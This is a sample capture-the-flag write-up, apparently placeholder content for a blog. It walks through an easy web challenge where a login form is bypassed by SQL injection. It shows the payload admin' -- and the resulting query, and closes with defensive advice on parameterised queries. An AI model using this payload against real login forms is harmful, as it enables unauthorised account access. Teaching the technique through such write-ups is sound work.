---
title: "Login Bypass via SQL Injection"
date: 2026-05-18
category: web
difficulty: easy
event: "Sample CTF 2026"
points: 100
tags: [sql-injection, authentication, web]
description: "A classic authentication bypass — the login form builds its query with unsanitised string concatenation, so a crafted username logs us in as admin."
---

> **Note:** This is a sample write-up to demonstrate the CTF section. Replace or
> delete it once you add your own. Front matter fields: `category`, `difficulty`
> (easy/medium/hard), `event`, `points`, `tags`, and `description`.

## Challenge

We're given a login page and told the flag lives in the admin account. No
credentials are provided.

```
Username: [        ]
Password: [        ]
```

## Recon

Submitting a quote in the username field (`'`) returns a 500 error with a SQL
fragment in the response — a strong signal the input is concatenated straight
into the query:

```
You have an error in your SQL syntax near ''' AND password='...'
```

That suggests the backend builds something like:

```sql
SELECT * FROM users WHERE username = '<input>' AND password = '<input>';
```

## Exploitation

Because the username is not parameterised, we can comment out the password check
and force the `WHERE` clause to always match:

```
Username: admin' --
Password: anything
```

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything';
```

The `--` comments out the rest of the line, so authentication succeeds as
`admin`. The dashboard renders the flag.

```
flag{sql_1nj3ct10n_15_st1ll_a_th1ng}
```

## Takeaways

- Always use **parameterised queries / prepared statements** — never string
  concatenation for SQL.
- Generic error pages (no SQL fragments leaked) would have made recon harder.
- Defence in depth: least-privilege DB accounts and a WAF raise the bar even
  when the primary bug exists.
